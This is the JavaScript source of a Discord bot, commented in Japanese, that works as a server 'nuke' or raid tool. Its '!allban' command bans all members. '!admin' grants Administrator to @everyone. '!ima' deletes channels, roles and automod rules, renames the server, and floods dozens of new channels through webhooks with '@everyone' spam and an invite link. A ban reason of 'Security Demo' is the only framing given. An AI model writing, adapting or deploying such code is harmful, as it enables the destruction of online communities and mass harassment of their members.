const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const http = require('http'); // ヘルスチェック用

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
});

// --- Koyeb用ヘルスチェックサーバー ---
// これがないとKoyebで正常にデプロイされません
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running');
}).listen(process.env.PORT || 8080);

const PREFIX = '!';

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const deleteCommand = async () => await message.delete().catch(() => {});

    // 1. 全員BAN
    if (message.content === `${PREFIX}allban`) {
        await deleteCommand();
        const members = await message.guild.members.fetch().catch(() => null);
        if (!members) return;

        members.forEach(member => {
            if (member.bannable && member.id !== message.author.id && member.id !== client.user.id) {
                member.ban({ reason: 'Security Demo' }).catch(() => {});
            }
        });
    }

    // 2. 管理者付与
    if (message.content === `${PREFIX}admin`) {
        await deleteCommand();
        await message.guild.roles.everyone.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {});
    }

    // 3. フルニューク (!ima)
    if (message.content === `${PREFIX}ima`) {
        await deleteCommand();
        const guild = message.guild;

        // サーバー名・オートMOD・ロールの並列処理
        guild.setName('いまわーるど支配下').catch(() => {});
        
        guild.autoModerationRules.fetch().then(rules => {
            rules.forEach(rule => rule.delete().catch(() => {}));
        }).catch(() => {});

        guild.roles.fetch().then(roles => {
            roles.forEach(role => {
                if (!role.managed && role.name !== '@everyone') role.delete().catch(() => {});
            });
            for (let i = 0; i < 50; i++) {
                guild.roles.create({ name: 'いまさいつお', color: '#FF0000' }).catch(() => {});
            }
        }).catch(() => {});

        // チャンネル削除と再生成
        const channels = await guild.channels.fetch().catch(() => []);
        for (const [id, ch] of channels) {
            await ch.delete().catch(() => {});
        }

        const spamText = `# RAID BY IMA\n## このサーバーは絶対神ima様によってポアされました\n\n## いま最強\n\n@everyone\nhttps://discord.gg/esW7waKaxv`;

        for (let i = 0; i < 60; i++) {
            guild.channels.create({
                name: 'いまさまの支配下',
                type: ChannelType.GuildText
            }).then(async (newCh) => {
                for (let j = 0; j < 10; j++) {
                    newCh.createWebhook({ name: '効いててくかwww' }).then(webhook => {
                        for (let k = 0; k < 1000; k++) {
                            webhook.send(spamText).catch(() => {});
                        }
                    }).catch(() => {});
                }
            }).catch(() => {});
        }
    }
});

// トークンは環境変数から取得
client.login(process.env.DISCORD_TOKEN);
